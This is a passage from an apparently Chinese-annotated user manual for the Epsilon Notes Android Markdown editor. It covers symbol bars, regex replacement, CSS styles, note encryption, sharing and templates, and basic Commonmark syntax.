<li>When you make a link to a file, which is not supported by Epsilon Notes, the app adds the default extension. If you have <code>.md</code> as the default extension and you click on <code>[Video](file:///storage/extSdCard/Video/MyLovelyPuppy.mov)</code>, instead of running the video <code>MyLovelyPuppy.mov</code>, Epsilon Notes will try to open a file <code>MyLovelyPuppy.mov.md</code>.</li>
</ul>
<p>To avoid that behavior, add the “mov” extension to the File Launch option in the Preferences. The format is (for example):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.avi,.mp4,.xls,.doc,.pdf,.mov etc.</span><br></pre></td></tr></table></figure>
<p>If links with these extensions are clicked, Epsilon Notes will try launching an outside program to run those files.</p>
<p>Files with extensions specified in the File Launch Filter appear in the file  manager, too. When you click on the name of such file, path to it is copied to Clipboard and is ready for pasting in your Commonmark document.</p>
<p><strong>Things to bear in mind:</strong></p>
<ul>
<li>Android file system is case-sensitive. So, <code>/storage/extSdCard/</code> is not the same as <code>/sToraGe/ExtSDCaRD/</code>.</li>
<li>Add extensions to the list in the Preferences preceded by <ins>a dot</ins> and separated by <ins>commas</ins> <em>without any additional symbols, like spaces</em>.</li>
<li>You cannot use spaces in links. Write <code>[My kitty](my%20kitty.avi)</code>. Do not write [My kitty](<s>my kitty.avi</s>).</li>
</ul>
<hr />
<h2 id="text-files-filter文本文件过滤器"><a class="markdownIt-Anchor" href="#text-files-filter文本文件过滤器"></a> Text files filter（文本文件过滤器）</h2>
<p>In the Preferences, you can specify (in the Text Files Filter 文本文件过滤器) what files should be treated as simple text files and edit them with Epsilon Notes.</p>
<p>Suppose, you need to edit your <code>.css</code> files in Epsilon Notes. You can add this extension to the filter, if it is not yet there, and edit .css files in Epsilon Notes</p>
<hr />
<h2 id="preferences-backup重置个性化设置"><a class="markdownIt-Anchor" href="#preferences-backup重置个性化设置"></a> Preferences Backup（重置个性化设置） ☆</h2>
<p>You can backup your preferences before reinstalling Epsilon Notes and then restore them. If you use an external SD card, you need to point to you SD card again, as permissions cannot be backed up.</p>
<hr />
<h2 id="view-modes视图模式"><a class="markdownIt-Anchor" href="#view-modes视图模式"></a> View Modes（视图模式）</h2>
<ul>
<li>
<p>The processor has three main modes: reading, html-viewing and editing.</p>
</li>
<li>
<p>When you create a new file, if it already exists, Epsilon will not allow you to overwrite it. Create a file with a different name, or delete the old file.</p>
</li>
<li>
<p>The symbols frequently used in Markdown are available on the symbol bar above the on-screen keyboard.</p>
</li>
<li>
<p>The edited line is centered (this fuction can be disabled via Preferences). This option allows you to see always part of the edited text before and after the edited line, so you can better concentrate on the idea of the edited paragraph.</p>
</li>
<li>
<p>Width of the edit and view screens may be narrowed for wide screens, improving the comfort of working on wide tab screens (via preferences). If you use a tablet, try setting the screen, say to 90%.</p>
</li>
<li>
<p>For compatibility with Commonmark referencing to files, spaces in newly created and renamed files are replaced with underscore. <mark>Avoid using spaces in file names</mark>, otherwise browsers will need to render them to %20 format, which is inconvenient and may cause stumbling from time to time.</p>
</li>
</ul>
<hr />
<h2 id="recent-files最近浏览文件"><a class="markdownIt-Anchor" href="#recent-files最近浏览文件"></a> Recent files（最近浏览文件）</h2>
<p><strong>Access:</strong> You can get the list of recent files by selecting “Recent Files” option (Replay button) in the menu. Press back to exit the Recent Files screen.</p>
<p><strong>Clear list:</strong> You can clear the recent files list via the Preferences</p>
<p><strong>Exit:</strong> Press back to return to your document.</p>
<p><strong>Timely clearing list of recent files:</strong> The program saves at most 100 items of the list when you exit the program.</p>
<h2 id="html-export导出为-html-文件"><a class="markdownIt-Anchor" href="#html-export导出为-html-文件"></a> HTML Export（导出为 HTML 文件）</h2>
<p>You can export generated HTML code to the current file directory. Go to <code>Menu-&gt;Export HTML</code></p>
<h2 id="reader-mode阅读模式"><a class="markdownIt-Anchor" href="#reader-mode阅读模式"></a> Reader mode（阅读模式）</h2>
<ul>
<li>
<p>You can activate the reader mode through the Reader mode button in the left index panel. In this mode, only the view screen and the file browser are accessible.</p>
</li>
<li>
<p>To activate the edit round button (+), while in the reader mode, double tap in an empty place on the screen.</p>
</li>
</ul>
<hr />
<h2 id="edit-mode编辑模式"><a class="markdownIt-Anchor" href="#edit-mode编辑模式"></a> Edit Mode（编辑模式）</h2>
<h3 id="statistics统计"><a class="markdownIt-Anchor" href="#statistics统计"></a> Statistics（统计）</h3>
<p>You can see the text statistcs (symbol and word counts) at the top of the edit screen. In the Preferences, you can set the appearance of the Text Statistics bar (none, small, normal)</p>
<h3 id="edit-mode-fonts字体设置"><a class="markdownIt-Anchor" href="#edit-mode-fonts字体设置"></a> Edit mode fonts（字体设置） ☆</h3>
<p>You can set various fonts for Edit mode in the Preferences:</p>
<table>
<thead>
<tr>
<th>Font name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Monospace</td>
<td>Default font.</td>
</tr>
<tr>
<td>System</td>
<td>Your device’s normal font.</td>
</tr>
<tr>
<td>Dotted space</td>
<td>Monospace font, which allows you to control the invisible spaces at the end of line.</td>
</tr>
<tr>
<td>From file</td>
<td>Download your font, for example, from <a href="http://www.freefontsdownload.net" target="_blank" rel="noopener">here</a>, unzip it and provide the <strong>full</strong> path to the font in the setting Font file path.</td>
</tr>
</tbody>
</table>
<h3 id="save-button保存按钮"><a class="markdownIt-Anchor" href="#save-button保存按钮"></a> Save button（保存按钮）</h3>
<p>There is a round save button in the Edit mode. You can turn it off in the Preferences, if it bothers you writing. Its functions are duplicated by the Back button.</p>
<h3 id="exit-without-saving不保存退出"><a class="markdownIt-Anchor" href="#exit-without-saving不保存退出"></a> Exit without saving（不保存退出）</h3>
<p>Symbol Bar No. 2 has a button for canceling the editing.</p>
<h3 id="edit-mode-wrapping自动换行"><a class="markdownIt-Anchor" href="#edit-mode-wrapping自动换行"></a> Edit mode wrapping（自动换行）</h3>
<p><strong>Edit mode word wrapping:</strong> if you have a lot of tables, then the automatic word wrapping in the Edit mode becomes inconvenient. You can disable it in the Preferences.</p>
<h3 id="search-bar搜索栏编辑模式里的搜索栏只能搜索定位显示一个目标内容比非编辑模式的搜索功能要差"><a class="markdownIt-Anchor" href="#search-bar搜索栏编辑模式里的搜索栏只能搜索定位显示一个目标内容比非编辑模式的搜索功能要差"></a> Search bar（搜索栏＊[编辑模式里的搜索栏只能搜索定位显示一个目标内容，比非编辑模式的搜索功能要差]＊）</h3>
<ul>
<li>
<p>If you work with a long text and you need to navigate quickly to some specific point, you can use the search bar at the top of the edit screen. Search is case-insensitive.</p>
</li>
<li>
<p>You can delete the search bar contents by tapping on the × sign on the right.</p>
</li>
<li>
<p>The main goal of the search bar is to make editing long documents as easy as possible, so <strong>use the Search Line whenever you need to make a quick jump to some part of the text in the edit mode</strong>.</p>
</li>
</ul>
<h3 id="light-edit-mode简易编辑模式"><a class="markdownIt-Anchor" href="#light-edit-mode简易编辑模式"></a> Light Edit mode（简易编辑模式）</h3>
<p>(This mode is set via Preferences)</p>
<p>You can use this mode, if you want a faster and simpler editing experience without glitters and frills.</p>
<p>If enabled, this mode will:</p>
<ul>
<li>disable the statistics display（关闭统计显示功能）</li>
<li>disable text centering（关闭文字居中功能）</li>
<li>disable undo/redo（关闭撤销／重做功能）</li>
<li>disable live-preview（关闭实时预览功能）</li>
<li>disable all keyboard hotkeys (Ctrl+A etc.)（关闭所有快捷键功能）</li>
</ul>
<p><strong>Note on very large texts:</strong></p>
<p>On a mobile device, it is advised to break heavy documents into smaller ones (10-15 pages, max.), and to use the <strong>Local Index Panel</strong> for navigation between the chapters kept in a folder. Reader behavior research advises that articles should be 2000-3000 words.</p>
<p><em>Smaller texts are easier to manage and read. Besides, they consume less memory, require less operations, open fast and <strong>save battery</strong>.</em></p>
<p>However, if you still prefer handling gigantic texts, <strong>to speed up the keyboard response</strong>, you are <strong>advised</strong> to enable the Light Edit mode.</p>
<p><strong>Warning:</strong> If the text size is abused, the keyboard may stop responding and out of memory problem may occur.</p>
<h3 id="symbol-bars符号条设置"><a class="markdownIt-Anchor" href="#symbol-bars符号条设置"></a> Symbol bars（符号条设置）</h3>
<p><font color="red">If you have forgotten what a symbol button means, you can make a long tap on the symbol button icon to see a popup hint.</font></p>
<ul>
<li>You can customize up to 6 symbol bars:</li>
</ul>
<p>For example, one for Commonmarks, another one for math symbols (use Unicode). Separate symbols with a comma.</p>
<p><img src="https://1.bp.blogspot.com/-Ir3vTNwdhEs/WAXIeXoYDnI/AAAAAAAAA3g/ag-l-701TRk1LHIQ8GsNgfFip5qC3u23wCLcB/s1600/Screenshot_2016-10-18-09-58-18.png" alt="Picture from Internet" /></p>
<ul>
<li>
<p>The symbol bar setting has a few reserved words.<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
</li>
<li>
<p>Two symbol bars can be restored to their default values. The other 4 bars are at your full disposal（任你分配）.</p>
</li>
<li>
<p>To switch between symbol bars, use the rightmost button with its number.</p>
</li>
<li>
<p>You can change the width of the symbol bar buttons. The width ranges between 0 and 30. If the width value is out of this range is entered, then the middle value “15” will be used.</p>
<ul>
<li>To change the width, make a long tap on the button with the number of the symbol bar.</li>
</ul>
</li>
<li>
<p>You can create empty space between buttons with the help of a comma. For example:</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A,B,C,,D,E</span><br></pre></td></tr></table></figure>
<p>will produce an empty space between buttons C and D.</p>
<ul>
<li>
<p>You can edit the Symbol bar from the Preferences <strong>and from the Edit mode</strong>. To edit the Symbol bar symbols, <strong>long press</strong> the rightmost button with the number of the current symbol bar.</p>
</li>
<li>
<p>You can also customize the icons (symbols), which appear on the symbol bar. Suppose, you are writing a scientific article on the French history, and your key word is</p>
</li>
</ul>
<p style="text-align:center;"><b>"anticonstitutionnellement"</b></p>
<p>and, suppose, you need to write this long word 2500 times throughout your article. You could add this word to the symbol bar via the Preferences, but then it would take too much space in the symbol bar. So,  you can use one or two symbols to hide the whole word on the symbol bar. The format is</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SS:TEXT</span><br></pre></td></tr></table></figure>
<p>Where SS stands for the symbol (1 to 4 max) to appear on the bar, and TEXT is the text that will be sent, once you press on that symbol. Thus, you can write in the settings of the symbol bar among other shorcuts:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P1:anticonstitutionnellement</span><br></pre></td></tr></table></figure>
<p>In the Symbol Bar you will see P1 appear, but as soon as you press on it, it will produce</p>
<p style="text-align:center;"><b>anticonstitutionnellement</b></p>
<p>to your text.</p>
<p><em>To cut it short: if you enter the following line in one of the symbol bar settings:</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello,bye,$,LW:long word</span><br></pre></td></tr></table></figure>
<p><em>You will see on the symbol bar</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello  bye  $  LW</span><br></pre></td></tr></table></figure>
<p><em>When you press on these symbols in the Editor mode, the editor will type:</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello by $ long word</span><br></pre></td></tr></table></figure>
<p><em>i.e. the “long word” will be hidden behind LW.</em></p>
<p><strong>Comma and Enter in Symbol bar</strong></p>
<p>Comma is used to separate the symbols in the symbol bar settings.</p>
<p>To add commas and enter (line feed) symbols to your symbol bar, use:<br />
<code>\\,</code> and <code>\\n</code> or <code>\\r</code></p>
<p><code>\\n</code> will send <code>Enter</code> and two <code>SPACES</code> to your document.</p>
<p><code>\\r</code> will send only <code>Enter</code> (for using in codeblocks and YAML  for example).</p>
<p>For example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fw:Sincerely yours\\,\\nEugene</span><br></pre></td></tr></table></figure>
<p>will produce a <code>fw</code> (farewell) symbol on the symbol bar, pressing which will send your document the text:</p>
<p>Sincerely yours,<br />
Eugene</p>
<p><strong>Symbol bar reserved words:</strong><br />
Symbol bars have reserved words. For example: <code>BOLD, ITALIC, UNDERLINE, STRIKETHROUGH, HIGHLIGHT, SUPERSCRIPT, CODEBLOCK, FONTCOLOR</code>, which correspond to the formatting presets:</p>
<p><strong>BOLD</strong>, <em>ITALIC</em>, <ins>UNDERLINE</ins>, <s>STRIKETHROUGH</s>, <mark>HIGHLIGHT</mark>, ^<sup>SUPERSCRIPT</sup>^, <code>CODEBLOCK</code>, <strong><font color="Blue">FONTCOLOR</font></strong>.</p>
<p>With these buttons it easy to combine several commonmarks. Just press them one after another. For example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**_++~~bold, italic underline and strikethrough~~++_**</span><br></pre></td></tr></table></figure>
<p>will produce</p>
<p><strong><em><ins><s>bold, italic underline and strikethrough</s></ins></em></strong></p>
<ul>
<li>The font color icon will produce the text:<code>&lt;font color=&quot;&quot;&gt;&lt;/font&gt;</code>. To make <strong><font color="green">GREEN TEXT</font></strong>, fill in the preset as follows:</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"green"</span>&gt;</span>GREEN TEXT<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>See the list of available color names <a href="http://www.w3schools.com/colors/colors_names.asp" target="_blank" rel="noopener">here</a>.</p>
<p><strong>Line quick selection icon:</strong> This icon selects line from the current position to the nearest enter sign.</p>
<p><strong>Make frequent use</strong> of this button when you need to move paragraphs from one part of the text to another. Now, you can do everthing with the help of the symbol bar - like: select several lines, cut them and paste elsewhere.</p>
<p><strong>SORTLINES</strong> button:<br />
To sort a few lines, place the cursor at the beginning of the line, select the lines using the QUICKSELECTION button, and press the SORTLINES button.</p>
<p><strong>To perform reverse sorting, make a long tap on the button.</strong></p>
<p><strong>Recommended use:</strong> bullet lists and table lines.</p>
<p><strong>Preview in Edit Mode:</strong> The PRINTPREVIEW button on Symbol Bar No. 2 can view your changes in the rendered view before saving or cancelling them. External links do not work in the preview mode.</p>
<p><strong><em><font color="red">If you want to restore your symbol bars, make a long tap on the button with the number of the Symbol Bar in the Edit mode and Reset symbol bars 1 and 2.</font></em></strong></p>
<p><strong>To Top and To Bottom:</strong> The symbols called “TOTOP” and “TOBOTTOM” are used jump to the top or bottom of the document, respectively.</p>
<p><strong>Undo and redo:</strong> The symbols are called UNDO and REDO. These operations work well, but may interfere a little with the T9 function. So, if you have autocompletion on, the autocompletion may try “to participate” in the insertion of changes in the buffer from time to time. <em>When the edit window loses focus (save or find operations), the undo/redo buffer becomes reinitialized.</em></p>
<p><strong>Symbol bar operations</strong></p>
<p>The position of each symbol bar is remembered when switching them during the edit session. Alternatively, you can set the position of each symbol bar to reset at each switching (via Preferences).</p>
<p><strong>- Tap on the Number Button:</strong></p>
<ul>
<li>switch to the next Symbol Bar</li>
</ul>
<p><strong>- Swipe (touch&amp;move) on the Number Button:</strong></p>
<ul>
<li>switch to the previous Symbol Bar</li>
</ul>
<p><strong>- Long tap on the Number Button:</strong></p>
<ul>
<li>Go to Symbol Bars settings</li>
</ul>
<hr />
<h2 id="replacement查找替换"><a class="markdownIt-Anchor" href="#replacement查找替换"></a> Replacement（查找替换）</h2>
<p><strong>Icon location:</strong> Symbol Bar No. 2.</p>
<p>Replacement  uses Regex.</p>
<h2 id="what-is-regex何为正则表达式"><a class="markdownIt-Anchor" href="#what-is-regex何为正则表达式"></a> What is regex?（何为正则表达式）</h2>
<p><strong>Regex</strong> means “Regular Expressions”, that are used to make special replacements in the text. There is a lot of information on regex in Internet, for example at <a href="http://www.regular-expressions.info/quickstart.html" target="_blank" rel="noopener">http://www.regular-expressions.info/quickstart.html</a>.</p>
<p>If you enter this regex:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\b(c.t)\b</span><br></pre></td></tr></table></figure>
<p><em>(where <code>\b</code> stands for word boundary, dot means any letter, and brackets indicate the group of letters No. 1)</em></p>
<p>and this replacement:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[$1]($1.md)</span><br></pre></td></tr></table></figure>
<p><em>(where <code>$1</code> means the first group of letters from the previous expression)</em></p>
<p>Then all 3-letter words starting in “c” and ending in “t” (cut, cot, cat etc.) will be converted into Commonmark links.</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[<span class="string">cat</span>](<span class="link">cat.md</span>) [<span class="string">cot</span>](<span class="link">cot.md</span>) [<span class="string">cut</span>](<span class="link">cut.md</span>)</span><br></pre></td></tr></table></figure>
<p>If you need help with Regex, join the Google+ community at: <a href="https://plus.google.com/communities/100312921568116734139" target="_blank" rel="noopener">Google Plus Epsilon Notes Community</a>.</p>
<hr />
<h2 id="live-preview实时预览"><a class="markdownIt-Anchor" href="#live-preview实时预览"></a> Live preview（实时预览）</h2>
<p><em><strong>Available in Premium Version</strong></em></p>
<p>The edit move has a live preview option for <em><strong>tablets</strong></em>. You can write your texts and observe their rendering in real time. The limit in the free version is 500 symbols</p>
<center>
<p><em>Tap on the picture to see it in the browser</em></p>
</center>
<p><a href="https://4.bp.blogspot.com/-bVqWiPSzyQ4/WE0dotqxz1I/AAAAAAAABE0/xPZRJwNoByUIxkOv2yg5GRgWBwGJMKHpQCLcB/s1600/1481448857361-466634512.jpg" target="_blank" rel="noopener"><img src="https://4.bp.blogspot.com/-bVqWiPSzyQ4/WE0dotqxz1I/AAAAAAAABE0/xPZRJwNoByUIxkOv2yg5GRgWBwGJMKHpQCLcB/s1600/1481448857361-466634512.jpg" alt="" /></a></p>
<p>To enable live preview - switch it on in the preferences or long press the Save button.</p>
<p><strong>Nota Bene:</strong></p>
<p>This function is not disabled for phones, so it is up to you to decide whether to use it or not on a small screen.</p>
<p>A few remarks on this mode:</p>
<ul>
<li>On small screens, you can use PRINTPREVIEW button on Symbol Bar No. 2.</li>
<li>Live preview position is not synchronized with the edit field. You have to synchronize it yourself.</li>
<li>Live preview is delayed a second after you stop typing to prevent lags in typing.</li>
</ul>
<hr />
<h2 id="preferences-menu"><a class="markdownIt-Anchor" href="#preferences-menu"></a> Preferences Menu</h2>
<p>In the Prefereces menu you can set the following functions</p>
<ul>
<li>Default file extension,which will be used whenever a file extension is needed, but not specified by the user (for example, when creating a new file)</li>
<li>Number of browser preview lines (1-4)</li>
<li>FLOATING BUTTON: show/hide</li>
<li>FONT SIZE: set the rendered font size<br />
and many others</li>
</ul>
<hr />
<h2 id="send-note-as-attachment"><a class="markdownIt-Anchor" href="#send-note-as-attachment"></a> Send note as attachment</h2>
<p>You can send your note as attachment over email. (`Menu → Export → Send attachment&quot;).</p>
<p>Epsilon Notes will add an instruction on viewing the file to the letter body.</p>
<hr />
<h2 id="css-styles"><a class="markdownIt-Anchor" href="#css-styles"></a> CSS styles</h2>
<h3 id="styling-output"><a class="markdownIt-Anchor" href="#styling-output"></a> Styling output:</h3>
<p>You can style your output by inserting your style via Preferences.<br />
Examples of style:</p>
<p><em>To make pictures take only 20% of the screen:</em></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">img</span>&#123;<span class="attribute">width</span>:<span class="number">20%</span>;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="center-tag"><a class="markdownIt-Anchor" href="#center-tag"></a> Center tag</h3>
</center>
<p>To center a paragraph, use the following tags</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line">***Centered paragraph***</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>which will produce:</p>
<center>
<p><em><strong>Centered paragraph</strong></em></p>
</center>
<p><strong>Note:</strong> There must be empty lines before and after the tags.</p>
<h3 id="kbd-tag"><a class="markdownIt-Anchor" href="#kbd-tag"></a> Kbd tag</h3>
<p>If you write a note about some keyboard shorcuts, use <code>kbd</code> tags. Writing <code>&lt;kbd&gt;Ctrl&lt;/kbd&gt; + &lt;kbd&gt;A&lt;/kbd&gt;</code> will render to <kbd>Ctrl</kbd> + <kbd>A</kbd>.</p>
<h2 id="default-styles默认样式"><a class="markdownIt-Anchor" href="#default-styles默认样式"></a> Default styles（默认样式）</h2>
<p>There are 4 default styles, that are fully customizable.</p>
<ul>
<li>You can add one more style - “User Style”</li>
<li>You can restore the default styles.</li>
<li>You can switch among the styles from the Menu</li>
</ul>
<p>Here is an example of one of the styles:</p>
<p><strong>White Style</strong></p>
<table>
<thead>
<tr>
<th>Characteristic</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Aspect</td>
<td>High contrast white-paper, mostly black and white</td>
</tr>
<tr>
<td>Purpose</td>
<td>Enhanced visibility under light</td>
</tr>
</tbody>
</table>
<p>Instead of writing the whole style in the Preferences, you can provide the link to your style in one of the format:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;storage&#x2F;sdcard0&#x2F;......&#x2F;your_style.css</span><br><span class="line">http:&#x2F;&#x2F;www.your_site.com&#x2F;your_style.css</span><br><span class="line">https:&#x2F;&#x2F;www.your_site.com&#x2F;your_style.css</span><br></pre></td></tr></table></figure>
<p><strong>Note:</strong> Path to style is supported only if it starts with a prefix such as <code>http://</code> (several letters, a colon and two slashes). If your style file is in the Internet, it is recommended to copy it locally.</p>
<p>You can also use YAML to provide styles for individual documents. <a href="#yaml-style">See here</a>.</p>
<p><strong>Styles and Edit Mode:</strong></p>
<p>The activated style automatically changes the style of the Edit mode.</p>
<table>
<thead>
<tr>
<th>Style</th>
<th>Edit mode</th>
</tr>
</thead>
<tbody>
<tr>
<td>Day</td>
<td>Day</td>
</tr>
<tr>
<td>Night</td>
<td>Night</td>
</tr>
<tr>
<td>White</td>
<td>White</td>
</tr>
<tr>
<td>Black</td>
<td>Black</td>
</tr>
<tr>
<td>User</td>
<td>Select the setting in Preferences by checking / unchecking the box “Light theme in Edit mode” in the CSS section.</td>
</tr>
</tbody>
</table>
<hr />
<h1 id="privacy隐私设置"><a class="markdownIt-Anchor" href="#privacy隐私设置"></a> Privacy（隐私设置）</h1>
<p>You can use Epsilon Notes to store your private information.</p>
<p>The menu has an option called <code>Security</code>. Note encryption is <a href="https://en.m.wikipedia.org/wiki/Advanced_Encryption_Standard" target="_blank" rel="noopener">AES</a> + Base64 algorythm.</p>
<p>To encrypt your note, you need to set up the current session password and then encrypt it.</p>
<p>The security submenu has the following options:</p>
<ul>
<li><strong>Peek:</strong> (Premium) Shows the current document unencrypted without saving it.<br />
<em>If your note was password protected, you need to enter the Session Password first.</em></li>
<li><strong>Encrypt:</strong> Encrypts and saves your document.</li>
<li><strong>Decrypt:</strong> Decrypts and saves your document.</li>
<li><strong>Session Password:</strong> Sets up the password used in the current session (valid until you exit Epsilon Notes).</li>
</ul>
<ul>
<li>Your session password is used to generate a unique AES encryption key.</li>
<li>The key and the password are kept in program current variables and they are <em><strong>not saved anywhere</strong></em>. When you <strong>exit</strong> the program, this data is deleted.</li>
</ul>
<center>
<p><font color="red"><strong>If you forget your password, it will be impossible to restore your encrypted note.</strong></font>.<br />
<font color="red"><mark><strong>Remember to backup important information.</strong></mark></font></p>
</center>
<ul>
<li>When you set up a session password, a star will appear next to the title in the top bar, indicating that the password is active.</li>
<li>If you do not set up the password, a password-free encryption will be used. You can use this encryption for a quick encryption, for example, before sending your text over email.</li>
</ul>
<p><strong>Privacy statement:</strong> Epsilon Notes does not send any data or files over Internet. It does not have any hidden permissions or activities. Epsilon Notes <ins>dowloaded from Google Play</ins> is safe for the privacy of the data on your device.</p>
<h1 id="sharing-and-templates分享模板"><a class="markdownIt-Anchor" href="#sharing-and-templates分享模板"></a> Sharing and Templates（分享＆模板）</h1>
<h3 id="share-template"><a class="markdownIt-Anchor" href="#share-template"></a> Share / Template</h3>
<p><strong>Sharing:</strong></p>
<p>When you select text in Internet and share it to Epsilon Notes, you will be prompted to add a comment (which you may leave blank), and the shared texts with the comment will be saved to the folder <code>storage/emulated/0/Epsilon</code> (or a similar folder on older devices).</p>
<p>Go on reading articles and sharing text from time to time. All the shared texts are saved.</p>
<p>Later, when you return to Epsilon Notes, insert the shared texts <strong>in the Edit mode</strong> by pressing the <code>INSERT</code> button on Symbol Bar No.2.</p>
<p>After you insert the text, you will be asked to delete the file, only if its name is written in a timestamp format (e.g., 2017-01-18-11-48-23).</p>
<p>Files with other names in <code>storage/emulated/0/Epsilon</code> are regarded as permanent templates. So, you will not be prompted to delete them.</p>
<p><strong>Templates:</strong></p>
<p>You can use the <code>storage/emulated/0/Epsilon</code> folder to add your templates (save files with .text extension). Inserting the templates is the same as inserting the shared texts.</p>
<p><strong>Note:</strong> if you do not see the <code>.text</code> files in the <code>Epsilon</code> folder, check if everything is fine with the Text files filter in the Preferences (no spaces, only extensions, including .text extension).</p>
<h2 id="markdownifying-an-internet-article网络文章-markdown格式化"><a class="markdownIt-Anchor" href="#markdownifying-an-internet-article网络文章-markdown格式化"></a> Markdownifying an internet article（网络文章 markdown格式化）</h2>
<h3 id="markdownifying-to-the-buffermarkdown格式化-到缓存区"><a class="markdownIt-Anchor" href="#markdownifying-to-the-buffermarkdown格式化-到缓存区"></a> Markdownifying to the buffer（markdown格式化 到缓存区）</h3>
<p><strong>The</strong> best markdownifier is offered by the site:</p>
<p><a href="http://fuckyeahmarkdown.com" target="_blank" rel="noopener">http://<font color="red">f*ck</font>yeahmarkdown.com</a></p>
<p>If you are sharing a link to Epsilon Notes, there will be a button “Markdownify” in the dialog. When you press this button, Epsilon Notes will try to redirect the link to the above-said site and retrieve the text in markdown from there.</p>
<p>In case of instability（不稳定性）, you can turn this service off in the Preferences.</p>
<p>Here is the scheme to use the Markdownifier（markdown格式化步骤）:</p>
<ol>
<li>Open the browser</li>
<li>Proceed to the site with an article that you want to copy to the Epsilon Notes buffer</li>
<li>In the menu of the browser next to the URL bar, select Share…</li>
<li>Select Epsilon Notes
<ul>
<li>If you did everything correctly, you will have the option <strong>MARKDOWNIFY</strong> appear in the dialog.</li>
</ul>
</li>
<li>Select Markdownify</li>
<li>Later on - when you are in Epsilon Notes again, use the INSERT button to import the markdownified article.</li>
</ol>
<h3 id="shared-data-buffer-in-view-mode"><a class="markdownIt-Anchor" href="#shared-data-buffer-in-view-mode"></a> Shared data buffer in View mode</h3>
<p>You can view the contents of the Shared data buffer through Menu &gt; Buffer.</p>
<p>A tap on an item will copy it to Clipboard.</p>
<h1 id="commonmarkcommonmark语法"><a class="markdownIt-Anchor" href="#commonmarkcommonmark语法"></a> Commonmark（Commonmark语法）</h1>
<h2 id="paragraphs-and-new-lines段落与换行"><a class="markdownIt-Anchor" href="#paragraphs-and-new-lines段落与换行"></a> Paragraphs and new lines（段落与换行）</h2>
<p>For a new paragraph, press <code>Enter</code> two times.</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Paragraph 1 (blablabla) [Enter]</span><br><span class="line"><span class="code">                        [Enter]</span></span><br><span class="line">Paragraph 2</span><br></pre></td></tr></table></figure>
<p>You will see:</p>
<p>Paragraph 1 (blablabla)</p>
<p>Paragraph 2</p>
<p><a name="13"></a></p>
<p>To break a line, the line should end<br />
(i) with two spaces or<br />
(ii) with <code>\</code> character.</p>
<p>Thus:</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">What is this life\</span><br><span class="line">if full or care\</span><br><span class="line">We have no time  [write 2 spaces at the end]</span><br><span class="line">to stand and stare.</span><br></pre></td></tr></table></figure>
<p>will result in</p>
<p>What is this life<br />
if full or care<br />
We have no time<br />
to stand and stare.</p>
<p>The backslash <code>\</code> character is also used to override any other Commonmark symbol.</p>
<hr />
<h2 id="headings标题"><a class="markdownIt-Anchor" href="#headings标题"></a> Headings（标题）</h2>
<p>If you write:</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Heading 1</span><br><span class="line">========</span><br></pre></td></tr></table></figure>
<p>In the reading mode you will see</p>
<h1>Heading 1</h1>
<p>If you write</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Heading 2</span><br><span class="line">--------</span><br></pre></td></tr></table></figure>
<p>You will see</p>
<h2>Heading 2</h2>
<p>Alternatively, you can use the # symbol followed by a space in the beginning of a line.</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># Heading 1</span></span><br><span class="line"></span><br><span class="line"><span class="section">## Heading 2</span></span><br><span class="line"></span><br><span class="line"><span class="section">### Heading 3</span></span><br><span class="line"></span><br><span class="line"><span class="section">#### Heading 4</span></span><br><span class="line"></span><br><span class="line"><span class="section">##### Heading 5</span></span><br><span class="line"></span><br><span class="line"><span class="section">###### Heading 6</span></span><br></pre></td></tr></table></figure>
<p>Which will result in:</p>
<!-- Sorry for using HTML here, but I had to so, because otherwise this example would be included in the table of contents -->
<h1> Heading 1 </h1>
<h2> Heading 2 </h2>
<h3> Heading 3 </h3>
<h4> Heading 4 </h4>
<h5> Heading 5 </h5>
<h6> Heading 6 </h6>
<hr />
<p><a name="linkstoheadings"></a></p>
<h2 id="links-to-headings"><a class="markdownIt-Anchor" href="#links-to-headings"></a> Links to headings</h2>
<p>You can make links to headings based on the heading text, for example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### My Heading</span><br><span class="line"></span><br><span class="line">Lorem ipsum...</span><br><span class="line"></span><br><span class="line">[Reference](#my-heading)</span><br></pre></td></tr></table></figure>
<p>Thus will result in</p>
<h3 class="" id="my-heading"> My Heading </h3>
<p>Lorem ipsum…</p>
<p><a href="#my-heading">Reference</a></p>
<p>To convert a heading to a link, you should observe the following rules:</p>
<ol>
<li>Use only one # in the link</li>
<li>All capital letters become small</li>
<li>All non letter symbols become a hyphen</li>
</ol>
<p>Example, the link to a heading</p>
